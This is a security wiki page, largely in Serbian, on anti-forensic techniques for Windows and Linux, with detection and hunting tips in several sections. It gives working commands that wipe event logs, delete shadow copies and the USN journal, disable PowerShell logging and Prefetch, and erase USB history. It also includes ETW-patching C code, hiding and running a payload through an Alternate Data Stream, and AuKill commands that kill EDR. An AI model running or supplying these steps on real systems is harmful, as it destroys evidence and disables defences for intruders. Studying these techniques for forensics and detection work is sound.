# Anti-Forensic Techniques

{{#include ../../banners/hacktricks-training.md}}

## Vremenske oznake

Napadač može biti zainteresovan za **menjanje vremenskih oznaka datoteka** kako bi izbegao otkrivanje.\
Vremenske oznake je moguće pronaći unutar MFT-a u atributima `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.

Oba atributa imaju 4 vremenske oznake: **izmena**, **pristup**, **kreiranje** i **izmena MFT registra** (MACE ili MACB).

**Windows explorer** i drugi alati prikazuju informacije iz atributa **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Ovaj alat **menja** informacije o vremenskim oznakama unutar atributa **`$STANDARD_INFORMATION`**, ali **ne** menja informacije unutar atributa **`$FILE_NAME`**. Zbog toga je moguće **identifikovati** **sumnjivu** **aktivnost**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. Alat [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) omogućava ispitivanje tih promena.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) je funkcija sistema NTFS (Windows NT file system) koja prati promene na volumenu. ...](<../../images/image (801).png>)

Prethodna slika prikazuje **izlaz** alata, gde se može videti da su neke **promene izvršene** nad datotekom.

### $LogFile

**Sve promene metapodataka sistema datoteka beleže se** u procesu poznatom kao [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zabeleženi metapodaci čuvaju se u datoteci pod nazivom `**$LogFile**`, koja se nalazi u korenom direktorijumu sistema datoteka NTFS. Alati kao što je [LogFileParser](https://github.com/jschicht/LogFileParser) mogu se koristiti za parsiranje ove datoteke i identifikovanje promena.

![Usnjrnl - $LogFile: Sve promene metapodataka sistema datoteka beleže se u procesu poznatom kao write-ahead logging. Zabeleženi metapodaci čuvaju se u datoteci pod nazivom $LogFile, koja se nalazi u korenom...](<../../images/image (137).png>)

Ponovo, u izlazu alata moguće je videti da su **neke promene izvršene**.

Korišćenjem istog alata moguće je identifikovati **u koje vreme su vremenske oznake izmenjene**:

![Usnjrnl - $LogFile: Korišćenjem istog alata moguće je identifikovati u koje vreme su vremenske oznake izmenjene](<../../images/image (1089).png>)

- CTIME: Vreme kreiranja datoteke
- ATIME: Vreme izmene datoteke
- MTIME: Izmena MFT registra datoteke
- RTIME: Vreme pristupa datoteci

### Poređenje `$STANDARD_INFORMATION` i `$FILE_NAME`

Drugi način za identifikovanje sumnjivo izmenjenih datoteka bio bi poređenje vremena u oba atributa, uz traženje **nepodudaranja**.

### Nanosekunde

Vremenske oznake sistema **NTFS** imaju **preciznost** od **100 nanosekundi**. Zbog toga je pronalaženje datoteka sa vremenskim oznakama poput 2010-10-10 10:10:**00.000:0000 veoma sumnjivo**.

### SetMace - Anti-forensic Tool

Ovaj alat može da izmeni oba atributa `$STARNDAR_INFORMATION` i `$FILE_NAME`. Međutim, počevši od sistema Windows Vista, neophodno je da se za izmenu ovih informacija koristi aktivni OS.

## Skrivanje podataka

NFTS koristi klaster i minimalnu veličinu informacija. To znači da, ako datoteka zauzima klaster i po, **preostala polovina se nikada neće koristiti** dok se datoteka ne obriše. Zatim je moguće **sakriti podatke u ovom slack prostoru**.

Postoje alati poput alata slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka `$logfile` i `$usnjrnl` može pokazati da su neki podaci dodati:

![SetMace - Anti-forensic Tool - Skrivanje podataka: Postoje alati poput alata slacker koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka $logfile i $usnjrnl može pokazati da su...](<../../images/image (1060).png>)

Zatim je moguće preuzeti slack prostor korišćenjem alata kao što je FTK Imager. Imajte na umu da ova vrsta alata može sačuvati sadržaj u obfuskiranom ili čak enkriptovanom obliku.

## UsbKill

Ovo je alat koji će **isključiti računar ako se otkrije bilo kakva promena na USB** portovima.\
Jedan od načina za otkrivanje ovoga jeste pregled aktivnih procesa i **provera svake pokrenute python skripte**.

## Live Linux Distributions

Ove distribucije se **izvršavaju unutar** RAM memorije. Jedini način da se otkriju jeste **ako je NTFS sistem datoteka montiran sa dozvolama za pisanje**. Ako je montiran samo sa dozvolama za čitanje, neće biti moguće otkriti upad.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows Configuration

Moguće je onemogućiti nekoliko Windows metoda logging-a kako bi se forenzička istraga znatno otežala.

### Disable Timestamps - UserAssist

Ovo je registry ključ koji održava datume i vremena kada je korisnik pokrenuo svaku izvršnu datoteku.

Onemogućavanje UserAssist-a zahteva dva koraka:

1. Postavite dva registry ključa, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, oba na nulu, kako biste signalizirali da želimo da UserAssist bude onemogućen.
2. Obrišite registry podstabla koja izgledaju kao `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Disable Timestamps - Prefetch

Ovo čuva informacije o aplikacijama koje su izvršene sa ciljem poboljšanja performansi Windows sistema. Međutim, ove informacije mogu biti korisne i za forenzičke postupke.

- Pokrenite `regedit`
- Izaberite putanju datoteke `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknite desnim tasterom miša na `EnablePrefetcher` i `EnableSuperfetch`
- Izaberite Modify za svaku od ovih stavki da biste promenili vrednost sa 1 (ili 3) na 0
- Ponovo pokrenite sistem

### Disable Timestamps - Last Access Time

Kad god se fascikla otvori sa NTFS volumena na Windows NT serveru, sistem ažurira polje vremenske oznake u svakoj navedenoj fascikli, koje se naziva vreme poslednjeg pristupa. Na intenzivno korišćenom NTFS volumenu ovo može uticati na performanse.

1. Otvorite Registry Editor (Regedit.exe).
2. Idite na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Pronađite `NtfsDisableLastAccessUpdate`. Ako ne postoji, dodajte ovaj DWORD i postavite njegovu vrednost na 1, čime će proces biti onemogućen.
4. Zatvorite Registry Editor i ponovo pokrenite server.

### Delete USB History

Svi **unosi USB uređaja** čuvaju se u Windows Registry-ju, pod registry ključem **USBSTOR**, koji sadrži podključeve kreirane svaki put kada USB uređaj priključite na računar ili laptop. Ovaj ključ možete pronaći ovde: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog ključa** obrisaćete USB istoriju.\
Možete koristiti i alat [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) kako biste bili sigurni da ste ih obrisali (i da biste ih obrisali).

Druga datoteka koja čuva informacije o USB uređajima jeste datoteka `setupapi.dev.log` unutar `C:\Windows\INF`. I nju bi trebalo obrisati.

### Disable Shadow Copies

**Izlistajte** shadow copies komandom `vssadmin list shadowstorage`\
**Obrišite** ih izvršavanjem komande `vssadmin delete shadow`

Možete ih obrisati i putem GUI-ja, prateći korake navedene na stranici [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Da biste onemogućili shadow copies, pratite [korake odavde](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otvorite program Services tako što ćete nakon klika na Windows start dugme u polje za tekstualnu pretragu upisati „services“.
2. Na listi pronađite „Volume Shadow Copy“, izaberite ga, a zatim otvorite Properties klikom desnim tasterom miša.
3. U padajućem meniju „Startup type“ izaberite Disabled, a zatim potvrdite promenu klikom na Apply i OK.

Takođe je moguće izmeniti konfiguraciju datoteka koje će biti kopirane u shadow copy registru `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Overwrite deleted files

- Možete koristiti **Windows alat**: `cipher /w:C` Ovo će naložiti alatu cipher da ukloni sve podatke iz dostupnog neiskorišćenog prostora na disku C.
- Možete koristiti i alate kao što je [**Eraser**](https://eraser.heidi.ie)

### Delete Windows event logs

- Windows + R --> eventvwr.msc --> Proširite „Windows Logs“ --> Kliknite desnim tasterom miša na svaku kategoriju i izaberite „Clear Log“
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Disable Windows event logs

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- U odeljku services onemogućite servis „Windows Event Log“
- `WEvtUtil.exec clear-log` ili `WEvtUtil.exe cl`

### Disable $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Novije verzije sistema Windows 10/11 i Windows Server čuvaju **bogate PowerShell forenzičke artefakte** u okviru
`Microsoft-Windows-PowerShell/Operational` (događaji 4104/4105/4106).
Napadači ih mogu onemogućiti ili obrisati u hodu:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Defenders should monitor for changes to those registry keys and high-volume removal of PowerShell events.

### ETW (Event Tracing for Windows) Patch

Endpoint security products se u velikoj meri oslanjaju na ETW. Popularna metoda za izbegavanje detekcije iz 2024. godine jeste patchovanje `ntdll!EtwEventWrite`/`EtwEventWriteFull` u memoriji, tako da svaki ETW poziv vraća `STATUS_SUCCESS` bez emitovanja događaja:
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Javno dostupni PoC-ovi (npr. `EtwTiSwallow`) implementiraju isti primitive u PowerShell-u ili C++-u.  
Pošto je zakrpa **lokalna za proces**, EDR-ovi koji rade unutar drugih procesa mogu da je ne primete.  
Detekcija: uporedite `ntdll` u memoriji sa verzijom na disku ili postavite hook pre user-mode-a.

### Oživljavanje Alternate Data Streams (ADS)

Malware kampanje iz 2023. godine (npr. **FIN12** loaderi) primećene su kako smeštaju binarne datoteke druge faze
unutar ADS-a kako bi ostale van vidokruga tradicionalnih skenera:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Izlistajte tokove pomoću `dir /R`, `Get-Item -Stream *` ili Sysinternals alata `streams64.exe`.
Kopiranje host fajla na FAT/exFAT ili putem SMB-a ukloniće skriveni tok i može se koristiti
da istražitelji povrate payload.

### BYOVD & “AuKill” (2023)

Bring-Your-Own-Vulnerable-Driver se sada rutinski koristi za **anti-forenziku** tokom ransomware
upada.
Open-source alat **AuKill** učitava potpisani, ali ranjivi driver (`procexp152.sys`) kako bi
suspendovao ili terminirao EDR i forenzičke senzore **pre šifrovanja i uništavanja logova**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Driver se nakon toga uklanja, ostavljajući minimalne artefakte.<sup>[[1]](#references)</sup>
Mere zaštite: omogućite Microsoft vulnerable-driver blocklist (HVCI/SAC)
i podesite upozorenja za kreiranje kernel servisa iz putanja u koje korisnik može da upisuje.

---

## Linux Anti-Forensics: Self-Patching i Cloud C2 (2023–2025)

### Samozakrpljivanje kompromitovanih servisa radi smanjenja detekcije (Linux)
Napadači sve češće „samozakrpe” servis odmah nakon njegovog iskorišćavanja kako bi sprečili ponovnu eksploataciju i potisnuli detekcije zasnovane na ranjivostima. Ideja je da se ranjive komponente zamene najnovijim legitimnim upstream binarnim datotekama/JAR datotekama, tako da skeneri prijave da je host zakrpljen, dok persistence i C2 ostaju aktivni.<sup>[[3]](#references)</sup>

Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)<sup>[[3]](#references)[[4]](#references)</sup>
- Nakon post-exploitation faze, napadači su preuzeli legitimne JAR datoteke sa Maven Central (repo1.maven.org), obrisali ranjive JAR datoteke iz ActiveMQ instalacije i ponovo pokrenuli broker.
- Time je početni RCE zatvoren, dok su drugi foothold-i (cron, izmene SSH konfiguracije, zasebni C2 implantati) ostali aktivni.

Operativni primer (ilustrativno)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forenzički/hunting saveti
- Pregledajte servisne direktorijume zbog neplaniranih zamena binarnih datoteka/JAR-ova:
- Debian/Ubuntu: `dpkg -V activemq` i uporedite hash vrednosti/putanje datoteka sa mirror-ima repozitorijuma.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Potražite verzije JAR-ova prisutne na disku koje nisu u vlasništvu package manager-a ili simboličke linkove ažurirane van predviđenog procesa.
- Vremenska linija: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` za korelaciju ctime/mtime sa periodom kompromitovanja.
- Shell history/process telemetry: dokaze o korišćenju `curl`/`wget` za `repo1.maven.org` ili druge artifact CDN-ove neposredno nakon početne eksploatacije.
- Upravljanje promenama: proverite ko je primenio „zakrpu“ i zašto, a ne samo da je prisutna zakrpljena verzija.

### C2 cloud-service-a sa bearer tokenima i anti-analysis stager-ima
Uočeni tradecraft kombinovao je više dugotrajnih C2 putanja i anti-analysis pakovanje:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF loader-i za otežavanje sandboxing-a i statičke analize (npr. encrypted PYZ, privremena ekstrakcija u `/_MEI*`).
- Indikatori: rezultati `strings` pretrage kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: ekstrakcija u `/tmp/_MEI*` ili prilagođene `--runtime-tmpdir` putanje.
- Dropbox-backed C2 koji koristi hardkodovane OAuth Bearer tokene
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` sa `Authorization: Bearer <token>`.
- Istražite proxy/NetFlow/Zeek/Suricata podatke zbog odlaznog HTTPS saobraćaja ka Dropbox domenima iz server workload-a koji obično ne sinhronizuju datoteke.
- Paralelni/rezervni C2 putem tunneling-a (npr. Cloudflare Tunnel `cloudflared`), uz zadržavanje kontrole ako je jedan kanal blokiran.
- Host IOCs: `cloudflared` procesi/jedinice, konfiguracija na `~/.cloudflared/*.json`, odlazni saobraćaj na port 443 ka Cloudflare edge-ovima.

### Persistence i „hardening rollback“ za održavanje pristupa (Linux primeri)
Napadači često kombinuju self-patching sa trajnim putanjama za pristup:<sup>[[3]](#references)</sup>
- Cron/Anacron: izmene `0anacron` stub-a u svakom `/etc/cron.*/` direktorijumu radi periodičnog izvršavanja.
- Istražite:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: omogućavanje root logovanja i menjanje podrazumevanih shell-ova za naloge sa niskim privilegijama.
- Istražite omogućavanje root logovanja:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# označite vrednosti poput "yes" ili previše permisivna podešavanja
```
- Istražite sumnjive interaktivne shell-ove na sistemskim nalozima (npr. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Nasumični beacon artifacts sa kratkim imenima (8 abecednih karaktera) upisani na disk koji takođe kontaktiraju cloud C2:
- Istražite:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders treba da korelišu ove artifacts sa eksternom izloženošću i događajima patching-a servisa kako bi otkrili anti-forensic self-remediation korišćen za prikrivanje početne eksploatacije.

## References

- [1] [Sophos X-Ops – AuKill: A Weaponized Vulnerable Driver for Disabling EDR (March 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite for Stealth: Detection & Hunting (June 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
